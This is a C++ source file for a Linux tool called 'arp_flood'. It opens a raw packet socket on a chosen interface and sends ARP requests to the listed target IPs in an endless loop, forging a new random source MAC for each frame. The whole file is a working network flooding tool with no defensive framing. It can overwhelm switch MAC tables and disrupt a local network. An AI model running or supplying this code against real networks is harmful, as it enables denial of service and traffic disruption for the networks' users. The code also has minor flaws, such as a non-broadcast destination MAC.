#include <vector>
#include <random>
#include <iterator>
#include <algorithm>
#include <cstring>
#include <cstdio>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>

struct Ip {
    uint8_t ip[4];
};

struct Mac {
    uint8_t mac[6];
};

static bool parse_ip(char const* src, Ip& out) {
    return sscanf(src, "%hhu.%hhu.%hhu.%hhu",
                  &out.ip[0], &out.ip[1], &out.ip[2], &out.ip[3]) == 4;
}

static void make_arp(Mac src_mac, Ip src_ip, Ip dest_ip,
                     std::vector<uint8_t>& buffer) {
    buffer.clear();
    auto ptr = std::back_inserter(buffer);

    // Dest
    std::fill_n(ptr, 6, 0xFE);

    // Src
    std::copy(std::begin(src_mac.mac), std::end(src_mac.mac), ptr);

    // Ethertype
    *ptr++ = 0x08;
    *ptr++ = 0x06;

    // HTYPE (1 for ethernet)
    *ptr++ = 0;
    *ptr++ = 1;

    // PTYPE 0x0800 for IPv4
    *ptr++ = 0x08;
    *ptr++ = 0x00;

    // hardware addr len
    *ptr++ = 6;

    // protocol length
    *ptr++ = 4;

    // Operation (1 for request)
    *ptr++ = 0;
    *ptr++ = 1;

    // Sender mac
    std::copy(std::begin(src_mac.mac), std::end(src_mac.mac), ptr);

    // Sender IP
    std::copy(std::begin(src_ip.ip), std::end(src_ip.ip), ptr);

    // target MAC (already zero)
    std::fill_n(ptr, 6, 0);

    // target IP
    std::copy(std::begin(dest_ip.ip), std::end(dest_ip.ip), ptr);
}

int main(int argc, char** argv) {
    if (argc < 4) {
        fprintf(stderr, "Usage: arp_flood <interface> <from_ip> <to_ip>\n");
        return 1;
    }

    // Open a raw socket
    auto const sock = socket(AF_PACKET, SOCK_RAW, 0);
    if (sock == -1) {
        perror("socket");
        return 1;
    }

    sockaddr_ll addr{};
    addr.sll_family = AF_PACKET;

    auto const ifindex = if_nametoindex(argv[1]);
    if (ifindex == 0) {
        perror("if_nametoindex");
        return 1;
    }
    addr.sll_ifindex = ifindex;

    auto const addr_ptr = reinterpret_cast<sockaddr*>(&addr);
    if (bind(sock, addr_ptr, sizeof(addr)) == -1) {
        perror("bind");
        return 1;
    }

    Ip from_ip;
    if (!parse_ip(argv[2], from_ip)) {
        fprintf(stderr, "Failed to parse IP: %s\n", argv[2]);
        return 1;
    }

    std::vector<Ip> to_ips;
    for (int i = 3; i < argc; ++i) {
        Ip to_ip;
        if (!parse_ip(argv[i], to_ip)) {
            fprintf(stderr, "Failed to parse IP: %s\n", argv[i]);
            return 1;
        }
        to_ips.push_back(to_ip);
    }

    std::mt19937 rng;
    std::uniform_int_distribution<uint8_t> dist(0, 255);
    std::vector<uint8_t> buffer;

    while (true) {
        for (auto const& to_ip : to_ips) {
            // Generate a random src mac
            Mac src_mac;
            for (int i = 0; i < 6; ++i) {
                uint8_t byte = dist(rng);
                if (i == 0) {
                    // Lowest bit of first byte must be clear so it isn't a multicast address
                    byte &= 0xFE;
                }
                src_mac.mac[i] = byte;
            }

            make_arp(src_mac, from_ip, to_ip, buffer);
            if (sendto(sock, buffer.data(), buffer.size(), 0, addr_ptr,
                       sizeof(addr)) == -1) {
                perror("send()");
            }
        }
    }
}
